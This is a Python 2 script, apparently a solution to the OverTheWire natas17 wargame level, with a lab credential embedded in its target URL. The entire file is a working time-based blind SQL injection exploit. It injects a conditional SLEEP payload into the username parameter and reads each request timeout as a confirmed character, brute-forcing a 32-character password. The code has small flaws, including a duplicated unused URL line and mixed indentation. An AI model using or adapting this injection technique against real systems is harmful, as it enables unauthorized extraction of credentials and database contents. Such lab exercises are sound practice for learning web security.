import requests

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Parsed characters, the ones that actually exist in the password
parsedChars = ''
# Final Password
password = ''
# Our target URL
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
        raise ValueError('Kabum? Couldn\'t connect to target :(')
else:
        print 'Target reachable. Starting character parsing...'

parseChars = allChars
print 'Characters parsed. Starting brute force...'

# Assuming password is 32 characters long
for i in range(32):
        for c in parseChars:
                # SQL time-based injection #2
                try:
			url=target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) #'
                        r = requests.get(target+'?username=natas18\" AND IF(password LIKE BINARY \"' + password + c + '%\", SLEEP(5), null) #', timeout=1)
                # Did we found the character at the i position of the password?
                except requests.exceptions.Timeout as e:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Done. Have fun!'
